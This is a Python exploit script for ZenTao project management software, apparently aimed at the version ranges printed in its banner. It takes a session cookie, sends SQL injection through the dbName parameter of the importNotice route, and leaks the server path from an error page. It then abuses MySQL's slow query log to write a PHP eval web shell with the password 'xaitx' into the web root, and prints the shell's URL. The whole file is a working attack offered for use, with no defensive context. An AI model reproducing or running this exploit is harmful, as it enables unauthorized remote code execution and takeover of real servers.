import re

import requests


class exp(object):

    def __init__(self, url):
        self.url = url
        self.headers = {"Referer": self.url}
        self.type = 1
        self.routes = {
            "a": ['/index.php?m=misc&f=captcha&sessionVar=user&uuid=1', '/index.php?m=convert&f=importNotice'],
            "b": ['/misc-captcha-user-1.html', '/convert-importNotice.html']
        }
        self.route()
        self.init()
        self.path = self.getPath()


    def route(self):
        res = requests.get(self.url)
        if "user-login" in res.text:
            self.type = "b"
        else:
            self.type = "a"

    def init(self):
        res = requests.get(self.url + self.routes[self.type][0])
        self.headers['cookie'] = res.headers.get("Set-cookie") + ";XDEBUG_SESSION=PHPSTORM"

    def sql(self, data):
        data = {
            "dbName": f"';{data}#"
        }
        res = requests.post(self.url + self.routes[self.type][1], headers=self.headers,
                            data=data)
        return res.text

    def getPath(self):
        res = self.sql("'xx")
        data = re.findall('#0 (.+?)module',res)
        return data[0] + "www/"

    def shell(self):
        # 0x3c3f706870206576616c28245f504f53545b277861697478275d293b  <?php eval($_POST['xaitx']);
        data = f"set global slow_query_log=1;set global slow_query_log_file='{self.path}www/shell.php'; select '<?php eval($_POST[\"xaitx\"]);' or sleep(11);#"
        res = self.sql(data)


if __name__ == '__main__':
    print("--------------------------------------------\n"
             "v17.4<= 禅道 <= v18.0.beta1（开源版）\n"
             "v3.4 <= 禅道 <= v4.0.beta1（旗舰版）\n"
             "v7.4 <= 禅道 <= v8.0.beta1（企业版）\n"
          "--------------------------------------------")
    url = input("url:")
    a = exp(url)
    a.shell()
    print("写入成功\n"
          f"url:{a.path}/shell.php\n"
          "密码：xaitx")
